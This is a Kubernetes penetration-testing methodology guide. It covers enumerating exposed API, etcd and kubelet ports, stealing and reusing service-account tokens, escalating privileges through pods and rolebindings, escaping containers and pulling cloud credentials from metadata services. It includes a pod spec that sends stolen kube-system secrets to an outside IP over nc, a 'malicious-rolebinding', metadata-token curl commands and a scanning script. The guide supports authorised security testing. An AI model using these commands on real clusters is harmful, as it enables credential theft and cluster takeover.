# Pentesting Kubernetes

- [Pentesting Kubernetes](#pentesting-kubernetes)
  - [Attack Surface](#attack-surface)
  - [Unauthenticated Enumeration](#unauthenticated-enumeration)
    - [Search repositories for secrets/credentials](#search-repositories-for-secretscredentials)
    - [Common Ports](#common-ports)
      - [Kubernetes API](#kubernetes-api)
      - [ETCD](#etcd)
      - [Kubelet](#kubelet)
  - [Authenticated Enumeration](#authenticated-enumeration)
    - [Self Subject Review](#self-subject-review)
    - [Enumerate Privileged Accounts](#enumerate-privileged-accounts)
  - [Privilege Escalation Vectors](#privilege-escalation-vectors)
    - [Secrets](#secrets)
    - [Create Pods/Deployments/Daemonsets](#create-podsdeploymentsdaemonsets)
    - [Weak PSPs / Security Controls](#weak-psps--security-controls)
    - [Create Roles/Bindings](#create-rolesbindings)
    - [Account/Group Impersonation](#accountgroup-impersonation)
    - [Pod Exec](#pod-exec)
  - [Attacks Leveraging Containers](#attacks-leveraging-containers)
    - [Enumeration](#enumeration)
      - [Sensitive information](#sensitive-information)
    - [Container Breakout](#container-breakout)
      - [writeable hostpath mount](#writeable-hostpath-mount)
      - [linux capabilities/privileged containers](#linux-capabilitiesprivileged-containers)
    - [Mounted Service account](#mounted-service-account)
    - [Application / Kernel exploits](#application--kernel-exploits)
    - [Sniffing](#sniffing)
    - [Scanning](#scanning)
    - [Using DNS](#using-dns)
      - [Abusing Tiller (deprecated)](#abusing-tiller-deprecated)
    - [Cloud Credentials](#cloud-credentials)
  - [Node Access](#node-access)
    - [Lateral movement](#lateral-movement)
    - [Privilege Escalation](#privilege-escalation)
  - [Methodology checks](#methodology-checks)
  - [Tools and Plugins](#tools-and-plugins)
  - [References and Links](#references-and-links)

## Attack Surface
https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

Kubernetes attack entrypoints:
- Application - Attacker able to compromise a vulnerability within an application to gain an initial foothold via a pod into the cluster
- Authenticated attackers / malicious insiders - Attacker gains authenticated access by accessing leaked/compromised kubeconfigs or cloud provider credentials such as those leaked in source code.
- Exposed endpoint - Misconfigured ingress, exposed services or Kube-API providing access to cluster resources
- Compromised Images - Backdoored/Vulnerable images from a private or public repository

access to secrets to get access tokens
is a secret managment solution like vault in place - can you access a token that has permissions in vault - check if vault is misconfigured to access multiple secrets...

## Unauthenticated Enumeration
### Search repositories for secrets/credentials
- https://github.com/ovotech/gitoops
- https://github.com/trufflesecurity/TruffleHog
- https://github.com/zricethezav/gitleaks
- https://github.com/michenriksen/gitrob

### Common Ports
By default, kubernetes components listen on the following ports:

- 443/TCP (Kubernetes API Port)
- 6443/TCP (Kubernetes API Port)
- 8443/TCP (Minikube API Port)
- 8080/TCP (Insecure K8s API Port)
- 10250/TCP (kubelet API)
- 10251/TCP (kube-scheduler)
- 10252/TCP (Controller-manager)
- 2379/TCP (etcd Storage)
- 2380/TCP (etcd Storage)
- 6666/TCP (etcd Storage/etcd Client Server) 	
- 4194/TCP (Container Metrics)
- 9099/TCP (calico-felix/Health Check Calico Server) 	
- 6782-4/TCP (Metrics and Endpoints) 	
- 30000-32767/TCP (NodePort services)

#### Kubernetes API
https://kubernetes.io/docs/tasks/administer-cluster/access-cluster-api/

By default, the Kubernetes API should block anonymous access however if it is misconfigured you may be able to use `curl` or the `kubectl` command line utility to issue commands. It may also be possible to use brute force tools such as `gobuster` to discover custom directories
```
curl http(s)://<Kubernetes-Master-Server>:<Port> # format
curl http://localhost:8080/api/v1 # example api directory
kubectl get pods # kubectl example
```

#### ETCD
https://etcd.io/docs/v3.4/dev-guide/interacting_v3/

Access to ETCD should be heavily restricted, however if ETCD is exposed you can use curl and the `etcdctl` binary to interact with it. 
```
curl http://<Kubernetes-Master-Server>:2379
curl http://<Kubernetes-Master-Server>:6666/v2/keys
etcdctl --endpoints=<Kubernetes-Master-Server>:2379 get / --prefix --keys-only
```
If you manage to compromise a TLS certificate and can access ETCD you have effective cluster admin permission as you can read and write all objects within the cluster database
```
etcdctl --endpoints=<Master-Node-IP>:2379 get / --prefix --keys-only
```

#### Kubelet
By default the Kubelet API allows anonymous authentication which provides full access to the API. Interesting endpoints include /pods, /run and /exec. 

It is possible to communicate with the API using curl e.g.
```
curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
  -d 'input=1' -d 'output=1' -d 'tty=1'                             \
  -d 'command=ls' -d 'command=/'
```
However, the [kubeletctl](https://github.com/cyberark/kubeletctl) tool can be used to scan for nodes with an exposed kubelet API and automate requests. If your able to find a misconfigured kubelet, the tool will help you run commands on containers, retrieve service account tokens and attempt to gain RCE.

## Authenticated Enumeration
If you can gain authenticated access to the API you will want to perform some further enumeration of the cluster to discover secrets and attempt to escalate privileges etc:

### Self Subject Review
https://www.mankier.com/1/kubectl-auth-can-i

The Kube API provides a 'SelfSubjectAccessReview' method which can be used to determine the actions an entity can perform within the cluster. You can use the kubectl auth can-i subcommand for quickly querying the API authorization layer to determine if the current user can perform a given action for a given (or all) resources.

Manually:
```
# One liner to list permissions
kubectl auth can-i --list

# Check all actions and resources - checks if admin
kubectl auth can-i '*' '*'

# Common actions and resources
can-i list/get/create secrets/pods/deployements 

# All namespaces
-A

# A given namespace
-n <namespace> 

# Impersonate a user (if allowed what actions can you perform as that entity)
--as <user/service> 
```

Tools:

The following tools can be installed with `krew` the kubectl plugin manager - https://github.com/kubernetes-sigs/krew

- https://github.com/corneliusweig/rakkess - RBAC access matrix tool makes it easy to visualise permissions.
- https://github.com/FairwindsOps/rbac-lookup - RBAC Lookup allows you to easily find Kubernetes roles and cluster roles bound to any user, service account, or group name.
- https://github.com/aquasecurity/kubectl-who-can - Shows which subjects have RBAC permissions to resources in Kubernetes.

Other useful krew plugins for assessments include:
- cert-manager
- get-all
- graph
- outdated
- rbac-lookup
- starboard
- who-can

### Enumerate Privileged Accounts
In kubernetes roles and permissions are created and assigned seperately, through roles and rolebindings. Roles can either be clusterwide (clusterroles) or namespaced (roles), and the permissions can be assigned clusterwide (clusterrolebinding) or namespaced (rolebinding).

You may be able to view roles and role bindings to discover privileged accounts within the cluster.

Manually:

```
kubectl get clusterroles -o json | jq . | less
kubectl get clusterrolebindings -o json | jq . | less
kubectl get roles -A -o json | jq . | less
kubectl get rolebindings -A -o json | jq . | less
```

Tools:
- https://github.com/cyberark/KubiScan

## Privilege Escalation Vectors
### Secrets
If you can retrieve secrets you may be able to elevate your privileges or move laterally to another namespace by accessing account tokens. Account tokens are stored as base64 encoded JWT values within secrets, if you can access secrets you can retrieve and decode the JWT and ca.crt to impersonate that service account. These can be passed in requests using `--token` or added as a context (https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#context) to the kubeconfig.
```
export TOKEN="eyJhb...etc..."
Curl method
curl -ks -H "Authorization: Bearer $TOKEN" \
https://<IP>:6443/api/v1/namespaces/{namespace}/secrets

Kubectl method
kubectl --insecure-skip-tls-verify=true  \
          --server="https://master:6443" \
          --token="<$TOKEN>"             \
          get secrets --all-namespaces -o json
```

Note - it's also worth checking pod specs, configmaps and secrets for other sensitive information such as SSH keys, OAuth tokens, credentials and URLS for other services may also be stored within kubernetes secrets.

### Create Pods/Deployments/Daemonsets
If you have permission to create pods (directly or via deployments and daemonsets etc) you can attempt to create a pod and mount a privileged service account to the pod either sending the token or capturing a reverse shell to escalate privileges.

An example podSpec mounting the privileged `bootstrap-signer` service account:
```
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```
### Weak PSPs / Security Controls
If there are permissive PSPs (or other policy controls) or you have sufficient privileges you may be able to create a pod that mounts a vulnerable hostpath or assigns extra linux capabilties in order to perform a container breakout or escalate privileges.

If they are using a custom security/admission controler such as OPA/Gatekeeper you may be able to gain access to the policies (via discovering authentication tokens or misconfigured authentication) to create permissive policies to deploy vulnerable pods

If you are able to deploy a daemonset you will get a copy of the pod on each node (you may have to specify taints and tolerations to get it on certain nodes - https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/) if you're able to deploy a vulnerable pod and breakout, each node may have different privileges - if you are able to breakout onto a master node or access etcd you will have full access to the cluster.

### Create Roles/Bindings
If you have the permission to create rolebindings you can assign extra permissions to yourself or entities under your control. You can also create new roles for persistence.
Example clusterrolebinding for getting cluster-admin
```
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespaces": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "sa-comp"
            "namespace": "default"
        }
    ]
}
```

### Account/Group Impersonation
If you have permission to impersonate other accounts they may have more permissions that provide additional privilege escation vectors. You can use curl or kubectl to impersonate accounts.
```
kubectl get pods -A --as=<account>
```

### Pod Exec
If you can exec to pods you may be able to breakout of the container to access the host, see below.
```
kubectl exec -it <POD NAME> -n <POD’S NAMESPACE> –- sh
```

## Attacks Leveraging Containers
### Enumeration
The tool - [Amicontained](https://github.com/genuinetools/amicontained) - can be used to find out what container runtime is being used as well as the capabilities available, linEnum and LinPEAS could also provide useful information.

#### Sensitive information
Administrators and applications may save sensitive files inside the container, such as passwords, files, ssh-keys, certificates, public-keys and private-keys. 

It is also worth manully checking the environmental variables as these may produce useful URLs/endpoints or potentially sensitive information:
```
KUBERNETES_SERVICE_HOST # Kubernetes API address
VAULT* # Vault URL / tokens
```
Note: Hashicorp vault is common for secrets management in cloud and kubernetes environments, the standard method is to mount tokens into a sidecar proxy, however they may be stored as secrets within the pod. If you can authenticate to vault as a service account you may be able to extract cloud credentials etc.

### Container Breakout
Detailed information regarding container enumeration and breakouts can be found in: [Pentesting Docker](../Docker/Pentesting_Docker.md) 
The sections below provide additional information for attacking containers in an orchestration environment:
#### writeable hostpath mount
Check for risky mount paths that could provide access to sensitive files (secrets, kubeconfigs, tokens etc...). If you're able to write to the hostpath you may be able to find an exploit such as dropping an SSH key on the host or creating a new user.

If the root filesystem is mounted you can change (chroot) the root directory of the pod to that of the node:
```
chroot /host/ bash
```

#### linux capabilities/privileged containers
Privileged containers, or those with additional capabilites, may provide access to the host kernel, if so you can attempt to create a reverse shell to the host. If you can view processes running on the host you may also be able to inject a shell into a PID on the host.

### Mounted Service account
Usually service accounts secrets will be mounted on the container typically this will be in the following directories:
- /run/secrets/kubernetes.io/serviceaccount
- /var/run/secrets/kubernetes.io/serviceaccount

The directory should contain the following files:
- ca.crt: Certificate to secure communications
- Namespace: The current namespace
- token: the JWT for the service account of the pod

Using these you will be able to perform authenticated communication with the API server using curl or by uploading the kubectl binary. You can then use the `auth can-I` method to check privileges for additional attack vectors.

### Application / Kernel exploits
Vulnerabilities in software versions of container images, and application dependancies may provide an exploit that can be leveraged to escape a container.

### Sniffing
By default there is no encryption in a cluster between pods so this should be provided by a service mesh, as such, it may be possible to sniff traffic using `tcpdump`. It may also be useful to spin up a sidecar container that proxies traffic to sniff communications a method of which can be found at - https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#sniffing

### Scanning
- Check if services expose any applications
```
kubectl get svc -A
kubectl get svc -n <namespace>
```
- Bash script to scan the IP ranges:
```
sudo apt-get install nmap

nmap-kube () 
{ 
nmap --open -T4 -A -v -Pn -p 443,2379,4194,6782-6784,6443,8443,8080,9099,10250,10255,10256 "${@}"
}
nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');                                                                  
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

### Using DNS
service discovery within kubernetes is provided by kube-dns so its useful to check `/etc/resolv.conf` for the dns server address. Using DNS lookups you may be able to discover useful services running in the cluster. Some services may use gRPC to communicate, it is worth attempting to communicate with the service to see if they enforce authentication etc see abusing Tiller below.

#### Abusing Tiller (deprecated)
Tiller was the server-side agent of Helm that was deprecated in Helm v2 though it's still worth checking in case a cluster is running an outdated version of helm. By default Tiller ran as cluster-admin and as such was a common priv esc target. By default, Tiller communicates over gRCP without authentication, as such it would be possible to communicate with it to using the outdated Helm binary and setting the --host flag to the tiller agent:
```
helm --host tiller-deploy.kube-system.svc.cluster.local:44134 ls
```
Helm can only be used to install, create and delete resources so can't be used to steal secrets directly. However it's possible to create a helm chart to deploy a container with a privileged account token and exfiltrate the secret:
- Blog - https://blog.ropnop.com/attacking-default-installs-of-helm-on-kubernetes/#exploiting-a-running-pod
- Helm Charts - https://github.com/ropnop/pentest_charts/tree/master/charts

### Cloud Credentials
If the cluster is hosted on a cloud service provider such as AWS, Azure, or GCP you can attempt to access the instance metadata service to retrieve valid IAM credentials to pivot into the cloud environment. Each provider has a metadata service for which Virtual Machines (in this case the kubernetes nodes) can request temporary access credentials - In some cases these may be over-privileged

Pods should not need to access the metadata endpoint so this should be restricted however you should attempt to query the instance metadata endpoint from a pod within the cluster. Note: if you gain access to the underlying node you will be able to use these credentials by running commands from the node or retrieving the credentails from the metatdata service.

Each Provider hosts instance metadata at the reserved 169.254.169.254 address:
```
AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

Azure 
(
    Must contain the header Metadata: true
    Must not contain an X-Forwarded-For header
)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s

GCP
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

## Node Access
If your able to break out of a pod/container and access the underlying node you will have access to the kubelet's token providing and potentially cloud credentials as mentioned above. 

### Lateral movement
Accessing the kubelet may not provide full cluster-admin, however using the kubelet you can access all pods running on the node which may include pods in other namespaces. 

### Privilege Escalation
If you're able to use the kubelet token to list secrets you may find a privileged service account token. If you can get all pods in the cluster you can try to find a privileged pod and check which node it is hosted on. You can then create a pod using the `nodeSelector` podspec or create a `daemonset` to deploy a pod to the same node. Breaking out of the pod will provide acceess to the privileged pods/tokens contained within.
## Methodology checks
Kubernetes version - CVE - kubectl version

check versions

latest/hash images - image pull policy

network segregation - worker to master, API, connect to etcd?

network security - TLS?

Review admission controllers

system:anonymous and system:unauthenticated

## Tools and Plugins
- https://github.com/inguardians/peirates
- https://github.com/Shopify/kubeaudit
- https://github.com/aquasecurity/kube-bench
- https://github.com/aquasecurity/kube-hunter


Krew
- access-matrix
- get-all
- graph
- outdated
- rbac-lookup
- starboard
- who-can

## References and Links

https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface

https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3

https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions

https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463

https://blog.ropnop.com/attacking-default-installs-of-helm-on-kubernetes/#exploiting-a-running-pod

https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/